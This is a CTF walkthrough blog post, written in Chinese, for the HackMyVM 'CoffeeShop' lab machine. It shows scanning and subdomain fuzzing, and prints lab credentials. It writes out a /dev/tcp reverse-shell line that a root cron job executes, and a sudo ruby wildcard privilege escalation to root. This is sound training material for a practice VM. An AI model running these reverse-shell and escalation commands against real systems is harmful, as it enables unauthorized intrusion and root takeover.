---
title: CoffeeShop
author: hgbe02
date: 2024-04-01
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/CoffeeShop.html"
---

# CoffeeShop

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325634.png" alt="image-20240401123115997" style="zoom:50%;" />

扫描一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325636.png" alt="image-20240401123319738" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
sudo nmap -sS -p 1-65535 10.0.2.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-01 00:34 EDT
Nmap scan report for 10.0.2.15
Host is up (0.000079s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2A:FE:97 (Oracle VirtualBox virtual NIC)
```

### 目录扫描

开启了80端口，尝试扫描目录：

```bash
gobuster dir -u http://10.0.2.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html.png,jpg,zip
```

```text
/.php                 (Status: 403) [Size: 274]
/.html.png            (Status: 403) [Size: 274]
/shop                 (Status: 301) [Size: 305] [--> http://10.0.2.15/shop/]
/.html.png            (Status: 403) [Size: 274]
/.php                 (Status: 403) [Size: 274]
/server-status        (Status: 403) [Size: 274]
```

以防万一，再扫一下：

```bash
dirsearch -u http://10.0.2.15
```

```text
[00:38:32] 403 -  274B  - /.ht_wsr.txt
[00:38:32] 403 -  274B  - /.htaccess.orig
[00:38:32] 403 -  274B  - /.htaccess.sample
[00:38:32] 403 -  274B  - /.htaccess_orig
[00:38:32] 403 -  274B  - /.htaccess_extra
[00:38:32] 403 -  274B  - /.htaccess_sc
[00:38:32] 403 -  274B  - /.htaccess.save
[00:38:32] 403 -  274B  - /.htaccessOLD2
[00:38:32] 403 -  274B  - /.htaccessOLD
[00:38:32] 403 -  274B  - /.htm
[00:38:32] 403 -  274B  - /.htaccess.bak1
[00:38:32] 403 -  274B  - /.htaccessBAK
[00:38:32] 403 -  274B  - /.html
[00:38:32] 403 -  274B  - /.htpasswds
[00:38:32] 403 -  274B  - /.htpasswd_test
[00:38:32] 403 -  274B  - /.httr-oauth
[00:38:33] 403 -  274B  - /.php
[00:38:57] 403 -  274B  - /server-status
[00:38:57] 403 -  274B  - /server-status/
[00:38:58] 301 -  305B  - /shop  ->  http://10.0.2.15/shop/
```

## 漏洞挖掘

### 勘察一下

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325638.png" alt="image-20240401124015785" style="zoom:50%;" />

源码里也没啥，插件显示了一些配置信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325639.png" alt="image-20240401124110200" style="zoom:33%;" />

### 查看敏感目录

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325640.png" alt="image-20240401124143710" style="zoom:50%;" />

有登录的地方，尝试一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325641.png" alt="image-20240401124203592" style="zoom: 50%;" />

弱口令、万能密码，但是无果，再翻翻：

尝试将host添加进去，看看能不能访问到：

```bash
echo '10.0.2.15 midnight.coffee' >> /etc/hosts
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325642.png" alt="image-20240401124831108" style="zoom: 33%;" />

ok。

查看一下之前看到的敏感文件：

```bash
/.htpasswds
/.htpasswd_test
You don't have permission to access this resource.
```

尝试FUZZ一下：

```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -u midnight.coffee  -H "Host: FUZZ.midnight.coffee"  --hh 1690 2>/dev/null
```

![image-20240401125523410](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325643.png)

尝试添加dns访问：

```bash
10.0.2.15 midnight.coffee dev.midnight.coffee
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325644.png" alt="image-20240401125722241" style="zoom: 33%;" />

给出了账号密码，尝试登录：

```bash
developer
developer
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325645.png" alt="image-20240401125815772" style="zoom: 33%;" />

```apl
tuna : 1L0v3_TuN4_Very_Much
```

### ssh连接

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325646.png" alt="image-20240401125939986" style="zoom:33%;" />

## 提权

### 信息搜集

```bash
tuna@coffee-shop:~$ sudo -l
[sudo] password for tuna: 
Sorry, user tuna may not run sudo on coffee-shop.
tuna@coffee-shop:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mrmidnight:x:1000:1000:mrmidnight:/home/mrmidnight:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
shopadmin:x:1001:1001:,,,:/home/shopadmin:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
tuna:x:1002:1002:,,,:/home/tuna:/bin/bash
tuna@coffee-shop:~$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * /bin/bash /home/shopadmin/execute.sh

cat: /etc/cron.weekly: Is a directory
tuna@coffee-shop:~$ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/21184/usr/lib/snapd/snap-confine
/snap/snapd/20290/usr/lib/snapd/snap-confine
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/snap/core20/2105/usr/bin/chfn
/snap/core20/2105/usr/bin/chsh
/snap/core20/2105/usr/bin/gpasswd
/snap/core20/2105/usr/bin/mount
/snap/core20/2105/usr/bin/newgrp
/snap/core20/2105/usr/bin/passwd
/snap/core20/2105/usr/bin/su
/snap/core20/2105/usr/bin/sudo
/snap/core20/2105/usr/bin/umount
/snap/core20/2105/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2105/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/fusermount3
/usr/bin/mount
/usr/libexec/polkit-agent-helper-1
tuna@coffee-shop:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
tuna@coffee-shop:~$ pwd
/home/tuna
tuna@coffee-shop:~$ ls -la
total 40
drwxr-x--- 3 tuna tuna 4096 Jan  3 18:49 .
drwxr-xr-x 5 root root 4096 Jan  3 17:12 ..
-rw------- 1 tuna tuna  839 Jan  3 18:40 .bash_history
-rw-r--r-- 1 tuna tuna  220 Jan  3 17:12 .bash_logout
-rw-r--r-- 1 tuna tuna 3771 Jan  3 17:12 .bashrc
drwx------ 2 tuna tuna 4096 Jan  3 18:49 .cache
-rw-r--r-- 1 tuna tuna  807 Jan  3 17:12 .profile
-rw------- 1 tuna tuna 8410 Jan  3 18:28 .viminfo
tuna@coffee-shop:~$ head .bash_history 
ls
touch coffee_list.txt
vim coffee_list.txt 
head coffee_list.txt 
vim coffee_list.txt 
mv coffee_list.txt unavailable.txt
ls
head unavailable.txt 
tail unavailable.txt 
mv unavailable.txt available.txt
tuna@coffee-shop:~$ tail .bash_history 
ls
cat /home/shopadmin/
cat /home/shopadmin/execute.sh
exit
cat /home/shopadmin/execute.sh
exit
cat /home/shopadmin/execute.sh
cd
ls
exit
tuna@coffee-shop:~$ cd /var/www/html
tuna@coffee-shop:/var/www/html$ ls -la
total 20
drwxr-xr-x 4 root root 4096 Jan  3 16:51 .
drwxr-xr-x 3 root root 4096 Jan  3 14:10 ..
-rw-r--r-- 1 root root 1690 Jan  3 16:51 index.html
drwxr-xr-x 3 root root 4096 Jan  3 18:49 shop
drwxr-xr-x 3 root root 4096 Jan  3 16:34 subdomaindeveloperdirectoryuwu
tuna@coffee-shop:/var/www/html$ cd shop
tuna@coffee-shop:/var/www/html/shop$ ls -la
total 24
drwxr-xr-x 3 root root 4096 Jan  3 18:49 .
drwxr-xr-x 4 root root 4096 Jan  3 16:51 ..
-rw-r--r-- 1 root root 1754 Jan  3 18:49 dashboard.php
-rw-r--r-- 1 root root 2577 Jan  3 16:47 index.html
-rw-r--r-- 1 root root 2970 Jan  3 17:02 login.php
drwxr-xr-x 2 root root 4096 Jan  3 16:46 stylesheet
tuna@coffee-shop:/var/www/html/shop$ cat login.php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();

$host = 'localhost';
$username = 'shopadmin';
$password = '1_4m_4dmin';
$database = 'midnightcoffee';
```

### mysql信息搜集

尝试切换用户

```apl
su shopadmin
1_4m_4dmin
# su: Authentication failure
```

mysql看一下相关信息：

```bash
mysql -u shopadmin -p
```

```c
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| midnightcoffee     |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use midnightcoffee;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+--------------------------+
| Tables_in_midnightcoffee |
+--------------------------+
| users                    |
+--------------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+-----------+--------------------------------------------------------------+----------------------------------+
| id | username  | password                                                     | auth_token                       |
+----+-----------+--------------------------------------------------------------+----------------------------------+
|  1 | shopadmin | $2a$12$yqH60OJyTqoPHXe1g1cGDu93me1v.wGcEEZV5rLy39stUJO.Xsjwi | NULL                             |
|  2 | tuna      | 1L0v3_TuN4_Very_Much                                         | NULL                             |
|  3 | developer | developer                                                    | 5b290480bcbaec662aa8531cbc6da4fc |
+----+-----------+--------------------------------------------------------------+----------------------------------+
3 rows in set (0.00 sec)
```

我擦，没啥用。。。

### 定时任务+反弹shell

定时任务扫到一个内容：

```apl
/home/shopadmin/execute.sh
```

查看一下相关内容：

```bash
#!/bin/bash

/bin/bash /tmp/*.sh
```

啊，这，在`tmp`创建一个`.sh`脚本，脚本内容是尝试反弹一个shell：

```bash
# tuna
cd /tmp;
echo "bash -c 'exec bash -i &>/dev/tcp/10.0.2.4/1234 <&1'" > exp.sh

# kali
pwncat-cs -lp 1234
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404011325647.png" alt="image-20240401131521143" style="zoom:50%;" />

### 信息搜集

```bash
sudo -l
Matching Defaults entries for shopadmin on coffee-shop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User shopadmin may run the following commands on coffee-shop:
    (root) NOPASSWD: /usr/bin/ruby * /opt/shop.rb
```

牛蛙，ruby是root权限！

查看一下：

```bash
cat /opt/shop.rb
puts "C0FF33 SHOPS R L33T"
```

看到哪个`*`了吗，这表明可以在中间添加任意字符：

```bash
echo "system '/bin/bash'" > /tmp/fuck.rb
sudo /usr/bin/ruby /tmp/fuck.rb /opt/shop.rb
```

然后就获得了root！

```css
sudo /usr/bin/ruby /tmp/fuck.rb /opt/shop.rb
root@coffee-shop:/home/shopadmin# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
root@coffee-shop:/home/shopadmin# cd /root;ls -la
total 64
drwx------  6 root root 4096 Feb  3 10:31 .
drwxr-xr-x 19 root root 4096 Jan  3 13:36 ..
-rw-------  1 root root 4345 Feb  3 10:32 .bash_history
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Jan  3 18:40 .cache
-rw-------  1 root root   20 Jan  3 18:20 .lesshst
drwxr-xr-x  3 root root 4096 Jan  3 13:45 .local
-rw-------  1 root root 1539 Jan  3 17:08 .mysql_history
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   25 Feb  3 10:31 root.txt
drwx------  3 root root 4096 Jan  3 13:37 snap
drwx------  2 root root 4096 Jan  3 13:37 .ssh
-rw-r--r--  1 root root    0 Jan  3 14:12 .sudo_as_admin_successful
-rw-------  1 root root 9874 Feb  3 10:31 .viminfo
root@coffee-shop:~# cat root.txt
C4FF3331N-ADD1CCCTIONNNN
root@coffee-shop:~# cd /home;ls
mrmidnight  shopadmin  tuna
root@coffee-shop:/home# cd tuna;ls
root@coffee-shop:/home/tuna# cd ..
root@coffee-shop:/home# cd shopadmin/;ls
execute.sh  user.txt
root@coffee-shop:/home/shopadmin# cat user.txt
DR1NK1NG-C0FF33-4T-N1GHT
```

